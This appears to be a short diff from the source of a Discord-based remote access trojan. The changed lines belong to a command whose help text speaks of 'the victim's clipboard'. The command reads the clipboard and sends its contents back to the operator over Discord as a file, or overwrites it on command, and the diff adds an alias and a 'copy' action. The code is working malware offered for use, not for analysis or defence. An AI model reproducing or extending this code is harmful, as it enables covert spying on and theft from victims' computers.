@@ -2048,11 +2048,11 @@ async def key(ctx, *, key: str = ""):
     except Exception as e:
         await ctx.send(f"Error executing command: {str(e)}")
 
-@bot.command(help="Get or set the victim's clipboard.", usage="$clipboard <get|set <text>>")
+@bot.command(aliases=["clip"], help="Get or set the victim's clipboard.", usage="$clipboard <get|set|copy> <text>")
 async def clipboard(ctx, *, args: str = None):
     try:
         if not args:
-            await ctx.send("Usage: `$clipboard <get|set <text>>`")
+            await ctx.send("Usage: `$clipboard <get|set|copy> <text>`")
             return
 
         parts = args.split(" ", 1)
@@ -2061,14 +2061,14 @@ async def clipboard(ctx, *, args: str = None):
         if action == "get":
             clip = pyperclip.paste()
             await ctx.fm_send(f"```{clip}```", clip, "clipboard.txt", "Current Clipboard.txt")
-        elif action == "set":
+        elif action in ("set", "copy"):
             if len(parts) == 1:
                 await ctx.send("Please provide text to set.")
                 return
             pyperclip.copy(parts[1])
             await ctx.send("Copied to clipboard.")
         else:
-            await ctx.send("Invalid action. Use `get` or `set`.")
+            await ctx.send("Invalid action. Use `get` or `set/copy`.")
     except Exception as e:
         await ctx.send(f"Error executing command: {e}")
 
